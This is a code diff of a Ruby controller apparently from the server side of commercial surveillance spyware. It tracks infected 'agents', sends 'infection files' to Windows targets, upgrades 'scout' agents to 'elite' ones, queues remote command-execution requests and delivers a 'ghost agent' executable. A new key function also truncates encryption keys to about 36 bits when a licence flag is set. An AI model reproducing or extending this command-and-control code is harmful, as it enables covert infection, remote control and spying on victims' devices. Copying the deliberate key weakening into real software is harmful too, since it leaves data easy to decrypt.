@@ -23,7 +23,7 @@ class AgentController < RESTController
 
     mongoid_query do
       db = Mongoid.database
-      j = db.collection('items').find(filter, :fields => ["name", "desc", "status", "_kind", "path", "type", "ident", "instance", "version", "platform", "uninstalled", "upgradable", "demo", "stat.last_sync", "stat.last_sync_status", "stat.user", "stat.device", "stat.source", "stat.size", "stat.grid_size", "stat.ghost"])
+      j = db.collection('items').find(filter, :fields => ["name", "desc", "status", "_kind", "path", "type", "ident", "instance", "version", "platform", "uninstalled", "upgradable", "demo", "scout", "stat.last_sync", "stat.last_sync_status", "stat.user", "stat.device", "stat.source", "stat.size", "stat.grid_size", "stat.ghost"])
       ok(j)
     end
   end
@@ -35,7 +35,7 @@ class AgentController < RESTController
 
     mongoid_query do
       db = Mongoid.database
-      j = db.collection('items').find({_id: BSON::ObjectId.from_string(@params['_id'])}, :fields => ["name", "desc", "status", "_kind", "stat", "path", "type", "ident", "instance", "platform", "upgradable", "deleted", "uninstalled", "demo", "version", "counter", "configs"])
+      j = db.collection('items').find({_id: BSON::ObjectId.from_string(@params['_id'])}, :fields => ["name", "desc", "status", "_kind", "stat", "path", "type", "ident", "instance", "platform", "upgradable", "deleted", "uninstalled", "demo", "scout", "version", "counter", "configs"])
 
       agent = j.first
 
@@ -146,13 +146,16 @@ class AgentController < RESTController
         seed = (0..11).inject('') {|x,y| x += alphabet[rand(0..alphabet.size-1)]}
         seed.setbyte(8, 46)
         doc[:seed] = seed
-        doc[:confkey] = (0..31).inject('') {|x,y| x += alphabet[rand(0..alphabet.size-1)]}
-        doc[:logkey] = (0..31).inject('') {|x,y| x += alphabet[rand(0..alphabet.size-1)]}
+        doc[:confkey] = calculate_random_key
+        doc[:logkey] = calculate_random_key
         doc[:configs] = []
       end
 
-      # make item accessible to this user
-      SessionManager.instance.add_single_accessible(@session, item._id)
+      # make item accessible to the current user (immediately)
+      SessionManager.instance.add_accessible(@session, item._id)
+
+      # make item accessible to all the other users (in a thread)
+      SessionManager.instance.rebuild_all_accessible
 
       Audit.log :actor => @session[:user][:name],
                 :action => "factory.create",
@@ -167,6 +170,25 @@ class AgentController < RESTController
 
       ok(item)
     end
+  end
+
+  def calculate_random_key
+    # pur alphabet is 64 combination
+    alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-'
+
+    # NOTE about the key space:
+    # the length of the key is 32 chars based on an alphabet of 64 combination
+    # so the combinations are 64^32 that is 2^192 bits
+
+    key = (0..31).inject('') {|x,y| x += alphabet[rand(0..alphabet.size-1)]}
+
+    # reduce the key space if needed
+    # if the license contains the flag to lower the encryption bits we have to
+    # cap this to 2^40 so we can cut the key to 6 chars that is 64^6 == 2^36 bits
+
+    key[6..-1] = "-" * (key.length - 6) if LicenseManager.instance.limits[:encbits]
+
+    return key
   end
 
   def get_new_ident
@@ -271,10 +293,10 @@ class AgentController < RESTController
   def status
     require_auth_level :server, :tech
     
-    # parse the platform to check if the agent is in demo mode ( -DEMO appended )
-    demo = @params['subtype'].end_with? '-DEMO'
-    platform = @params['subtype'].gsub(/-DEMO/, '').downcase
-    
+    demo = (@params['demo'] == 'true') ? true : false
+    scout = (@params['scout'] == 'true') ? true : false
+    platform = @params['platform'].downcase
+
     # retro compatibility for older agents (pre 8.0) sending win32, win64, ios, osx
     case platform
       when 'win32', 'win64'
@@ -286,18 +308,33 @@ class AgentController < RESTController
       when 'macos'
         platform = 'osx'
     end
-    
+
     # is the agent already in the database? (has it synchronized at least one time?)
     agent = Item.where({_kind: 'agent', ident: @params['ident'], instance: @params['instance'].downcase, platform: platform, demo: demo}).first
 
     # yes it is, return the status
     unless agent.nil?
-      trace :info, "#{agent[:name]} is synchronizing (#{agent[:status]})"
+      trace :info, "#{agent[:name]} status is #{agent[:status]} [#{agent[:ident]}:#{agent[:instance]}] (demo: #{demo}, scout: #{scout})"
 
       # if the agent was queued, but now we have a license, use it and set the status to open
       # a demo agent will never be queued
       if agent[:status] == 'queued' and LicenseManager.instance.burn_one_license(agent.type.to_sym, agent.platform.to_sym)
         agent.status = 'open'
+        agent.save
+      end
+
+      # the agent was a scout but now is upgraded to elite
+      if agent.scout and not scout
+        # add the upload files for the first sync
+        agent.add_first_time_uploads
+
+        # add the files needed for the infection module
+        agent.add_infection_files if agent.platform == 'windows'
+      end
+
+      # update the scout flag
+      if agent.scout != scout
+        agent.scout = scout
         agent.save
       end
 
@@ -324,6 +361,7 @@ class AgentController < RESTController
     agent.platform = platform
     agent.instance = @params['instance'].downcase
     agent.demo = demo
+    agent.scout = scout
 
     # default is queued
     agent.status = 'queued'
@@ -339,17 +377,23 @@ class AgentController < RESTController
     # save the new instance in the db
     agent.save
 
-    # add the upload files for the first sync
-    agent.add_first_time_uploads
+    # the scout must not receive the first uploads
+    unless scout
+      # add the upload files for the first sync
+      agent.add_first_time_uploads
 
-    # add the files needed for the infection module
-    agent.add_infection_files if agent.platform == 'windows'
+      # add the files needed for the infection module
+      agent.add_infection_files if agent.platform == 'windows'
+    end
 
     # add the new agent to all the accessible list of all users
-    SessionManager.instance.add_accessible(factory, agent)
+    SessionManager.instance.add_accessible_agent(factory, agent)
 
     # check for alerts on this new instance
     Alerting.new_instance agent
+
+    # notify the injectors of the infection
+    ::Injector.all.each {|p| p.disable_on_sync(factory)}
 
     status = {:deleted => agent[:deleted], :status => agent[:status].upcase, :_id => agent[:_id]}
     return ok(status)
@@ -394,8 +438,8 @@ class AgentController < RESTController
 
     case @request[:method]
       when 'GET'
-        config = agent.configs.where(:activated.exists => false).last
-        return not_found if config.nil?
+        config = agent.configs.last
+        return not_found if config.nil? or config.activated
 
         # we have sent the configuration, wait for activation
         config.sent = Time.now.getutc.to_i
@@ -410,7 +454,7 @@ class AgentController < RESTController
         return ok(enc_config, {content_type: 'binary/octet-stream'})
         
       when 'DELETE'
-        config = agent.configs.where(:activated.exists => false).last
+        config = agent.configs.last
         # consistency check (don't allow a config which is activated but never sent)
         config.sent = Time.now.getutc.to_i if config.sent.nil? or config.sent == 0
         config.activated = Time.now.getutc.to_i
@@ -572,7 +616,7 @@ class AgentController < RESTController
 
   # retrieve the list of filesystem for a given agent
   def filesystems
-    require_auth_level :server, :tech
+    require_auth_level :server, :tech, :view
 
     mongoid_query do
       agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
@@ -610,6 +654,18 @@ class AgentController < RESTController
     end
   end
 
+  # fucking flex that does not support the DELETE http method
+  def filesystem_destroy
+    require_auth_level :tech, :view
+
+    mongoid_query do
+      agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
+      agent.filesystem_requests.destroy_all(conditions: { _id: @params['filesystem']})
+      Audit.log :actor => @session[:user][:name], :action => "agent.filesystem", :desc => "Removed a filesystem request for agent '#{agent['name']}'"
+      return ok
+    end
+  end
+
   def purge
     require_auth_level :server, :tech, :view
 
@@ -624,16 +680,58 @@ class AgentController < RESTController
           purge = agent.purge unless agent.purge.nil?
           return ok(purge)
         when 'POST'
+          # purge local pending requests
+          agent.upload_requests.destroy_all
+          agent.filesystem_requests.destroy_all
+          agent.download_requests.destroy_all
+          agent.upgrade_requests.destroy_all
+          agent.upgradable = false
+
           agent.purge = @params['purge']
           agent.save
           trace :info, "[#{@request[:peer]}] Added purge request #{@params['purge']}"
-          Audit.log :actor => @session[:user][:name], :action => "agent.purge", :desc => "Added a purge request for agent '#{agent['name']}'"
+          Audit.log :actor => @session[:user][:name], :action => "agent.purge", :desc => "Issued a purge request for agent '#{agent['name']}'"
         when 'DELETE'
           agent.purge = [0, 0]
           agent.save
           trace :info, "[#{@request[:peer]}] Purge command reset"
       end
 
+      return ok
+    end
+  end
+
+  def exec
+    require_auth_level :server, :tech, :view
+
+    mongoid_query do
+      agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
+
+      case @request[:method]
+        when 'GET'
+          list = agent.exec_requests
+          return ok(list)
+        when 'POST'
+          agent.exec_requests.create(@params['exec'])
+          trace :info, "[#{@request[:peer]}] Added download request #{@params['exec']}"
+          Audit.log :actor => @session[:user][:name], :action => "agent.exec", :desc => "Added a command execution request for agent '#{agent['name']}'"
+        when 'DELETE'
+          agent.exec_requests.destroy_all(conditions: { _id: @params['exec']})
+          trace :info, "[#{@request[:peer]}] Deleted the EXEC #{@params['exec']}"
+      end
+
+      return ok
+    end
+  end
+
+  # fucking flex that does not support the DELETE http method
+  def exec_destroy
+    require_auth_level :tech
+
+    mongoid_query do
+      agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
+      agent.exec_requests.destroy_all(conditions: { _id: @params['exec']})
+      Audit.log :actor => @session[:user][:name], :action => "agent.exec", :desc => "Removed a command execution request for agent '#{agent['name']}'"
       return ok
     end
   end
@@ -647,7 +745,6 @@ class AgentController < RESTController
       agent = Item.where({_kind: 'agent', ident: ident, instance: Regexp.new(instance.prepend('^'))}).first
 
       return if agent.nil?
-
       trace :info, "[#{@request[:peer]}] Ghost Agent request for #{agent.ident} #{agent.instance}"
 
       # update the stats
@@ -655,18 +752,18 @@ class AgentController < RESTController
       agent.stat[:last_sync_status] = RCS::DB::EvidenceManager::SYNC_GHOST
       agent.stat[:ghost] = true
       agent.save
+
+      file = "#{agent.ident}:#{agent.instance}.exe"
+
+      return not_found() unless File.exist? Config.instance.temp(file)
+
+      content = File.binread(Config.instance.temp(file))
+      FileUtils.rm_rf Config.instance.temp(file)
+
+      trace :info, "[#{@request[:peer]}] Ghost Agent sent: #{file} (#{content.bytesize} bytes)"
+
+      return ok(content, {content_type: 'binary/octetstream'})
     end
-
-    file = "#{agent.ident}:#{agent.instance}.exe"
-
-    return not_found() unless File.exist? Config.instance.temp(file)
-
-    content = File.binread(Config.instance.temp(file))
-    FileUtils.rm_rf Config.instance.temp(file)
-
-    trace :info, "[#{@request[:peer]}] Ghost Agent sent: #{file} (#{content.bytesize} bytes)"
-
-    return ok(content, {content_type: 'binary/octetstream'})
   end
 
   def activate_ghost
